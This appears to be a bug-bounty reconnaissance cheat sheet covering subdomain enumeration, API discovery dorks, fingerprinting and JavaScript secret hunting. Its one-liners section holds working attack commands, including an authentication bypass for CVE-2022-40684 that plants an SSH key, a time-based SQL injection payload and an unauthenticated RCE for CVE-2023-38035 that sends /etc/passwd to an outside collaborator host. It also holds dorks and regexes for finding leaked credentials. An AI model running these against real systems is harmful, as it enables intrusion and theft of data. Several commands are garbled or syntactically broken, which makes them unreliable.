# Reconnaissance

## Subdomain Enumeration

> **Tools**

* https://github.com/h0tak88r/AutoSubRecon
* https://github.com/h0tak88r/submonit88r
* https://github.com/bing0o/SubEnum
* https://github.com/shmilylty/OneForAll

> **Write ups**

* https://h0tak88r.medium.com/mastering-subdomain-enumeration-6c84571b07b
* https://h0tak88r.github.io/posts/Deep-Subdomains-Enumeration/
*

## API Recon

1. Check for documentation
   * Swagger -> `/openapi.json`
   * GraphQL -> https://graphql.org/learn/introspection/ -> https://github.com/prisma-labs/get-graphql-schema
   * manual -> `site:target.tld intitle:api | developer`
2. Search for APIs
   * `site:target.tld inurl:api`
   * `intitle:"index of" "api.yaml" site:target.tld`
   * `intitle:"index of" intext:"apikey.txt" site:target.tld`
   * `allintext:"API_SECRET*" ext:env | ext:yml site:target.tld`
3. Enumerate endpoints / methods
   * https://wordlists-cdn.assetnote.io/data/automated/httparchive\_apiroutes\_2023\_08\_28.txt
   * swagger -> https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/swagger.txt
   * Tools -> [ffuf](https://github.com/ffuf/ffuf#post-data-fuzzing) -> [kiterunner](https://github.com/assetnote/kiterunner)

## One-liners & Quick Wins

```bash
# Grep emails and other PII Data from URLs file
grep -E -o '\\\\\\\\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\\\\\.[a-zA-Z]{2,}\\\\\\\\b' urls.txt

#Extract Endpoints from JavaScript
cat FILE.js | grep -oh "\\\\\\\\"\\\\\\\\/[a-zA-Z0-9_/?=&]&\\\\\\\\""| sed -e 's/^"//' -e 's/"$//' | sort -u

#Get CIDR & Org Information from Target Lists
for HOST in $(cat HOSTS.txt); do echo (for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\\\\\\\\|Organization" | tr -s " | paste -; done | uniq); done
"
#Prototype Pollution
subfinder -d HOST -all -silent ❘ httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\\\\\\\\/?_proto_[testparam]=exploit\\\\\\\\//' FILE.txt | page- fetch -j 'window.testparam == "exploit"? "[VULNERABLE]": "[NOT VULNERABLE]" | sed "s/(//g" sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
'
# Sitemap SQL Injection
cat urls.txt | httpx -silent -path 'sitemap.xml?offset=1%3bSELECT%20IF((8303%3E8302)%2cSLEEP(10)%2c2356)%23' -rt -timeout 20 -mrt '>10'

# Authentication Bypass (CVE-2022-40684) POC --> <https://twitter.com/h4x0r_dz/status/1580648642750296064/photo/1>
ffuf -w "host_list.txt:URL" -u "<https://URL/api/v2/cmdb/system/admin/admin>" -X PUT -H 'User-Agent: Report Runner' -H 'Content-Type: application/json' -H 'Forwarded: for="[127.0.0.1]:8000";by=”[127.0.0.1]:9000";' -d '{"ssh-public-key1": "h4x0r"}' -mr "SSH" -r

## CVE-2023-26256 -> <https://github.com/aodsec/CVE-2023-26256>
git clone <https://github.com/aodsec/CVE-2023-26256.git>
python3 CVE-2023-26256.py -h

# CVE-2023-38035 - Unauth. RCE
python3 -c "from pyhessian.client import HessianProxy as H; H('https://TARGET-DOMAIN:8443/mics/services/MICSLogService').uploadFileUsingFileInput({'command': 'curl -X POST -d @/etc/passwd [BURP-COLLABORATOR-URL.com](https://burp-collaborator-url.com/)', 'isRoot': True}, None)"

# Quick Port Scanning with Fuzzing
cat ips.txt|naabu -silent -tp 1000 -o top1k.txt;cat top1k.txt|grep -vE ':80|:443' | httpx -silent -fc 400,503,204,405 -o httpx.txt;cat httpx.txt|python3 [dirsearch.py](https://dirsearch.py/) --stdin -e '*' -t 60 -w onelistforall.txt -i 200,301,302 --format plain -o report.txt

# SSRF use Autorize Exxtension Match and replace 
https?://(www.)?[-a-zA-Z0–9@:%.+~#=]{1,256}.[a-zA-Z0–9()]{1,6}\b([-a-zA-Z0–9()@:%+.~#?&//=]*)

```

***

## Fingerprinting

*   Port Scanning [https://github.com/nullt3r/jfscan](https://github.com/nullt3r/jfscan)

    ```bash
    # Before installation
    sudo apt install libpcap-dev
    sudo apt-get --assume-yes install git make gcc
    #masscan
    git clone <https://github.com/robertdavidgraham/masscan>
    cd masscan
    make
    sudo make install
    sudo setcap CAP_NET_RAW+ep /usr/bin/masscan
    sudo apt install python3 python3-pip
    # install jfscan
    git clone <https://github.com/nullt3r/jfscan.git>
    cd jfscan
    cd jfscan
    # incase of error running 
    export PATH="$HOME/.local/bin:$PATH"
    ```
*   Waf Detect

    ```bash
    nuclei -l urls.txt -t nuclei_templates/waf
    sudo apt install wafw00f
    wafw00f -l urls.txt
    ```
*   [**uncover**](https://github.com/projectdiscovery/uncover) >> discover exposed hosts on the internet. It is built with automation in mind, so you can query it and utilize the results with your current pipeline tools.

    ```python
    # installation
    go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest
    # configuration file 
    $HOME/.config/uncover/provider-config.yaml
    # usage
    uncover -q "test.com" -e censys,fofa,shodan
    ```

## JS Files

> **Tools**

* [Scripts/python scripts/JS\_Leaks\_spider.py](https://github.com/h0tak88r/Scripts/blob/main/python%20scripts/JS\_Leaks\_spider.py)
* Use This Extension to analyse JS Files [FindSomething - Chrome Web Store (google.com)](https://chrome.google.com/webstore/detail/findsomething/kfhniponecokdefffkpagipffdefeldb/related)
* [Can analyzing javascript files lead to remote code execution? | by Asem Eleraky | Medium](https://melotover.medium.com/can-analyzing-javascript-files-lead-to-remote-code-execution-f24112f1aa1f)

```bash
# Collect JS Files
katana -list targets.txt -jc | grep “\\.js$” | uniq | sort -u | tee JS.txt

# or use gau tool
cat targets.txt | gau |  grep “\\.js$” | uniq | sort -u | tee JS2.txt

# Analyzing JS files
nuclei -l JS.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt
nuclei -l JS2.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt
cat Js_urls.txt | Mantra



# Download all JS files 
file="JS.txt"
while IFS= read -r link
do
    wget "$link"
done < "$file"

file="JS2.txt"
while IFS= read -r link
do
    wget "$link"
done < "$file"

# Use This Regex to search for sensitive info 
grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp|GTM-" *.js

```
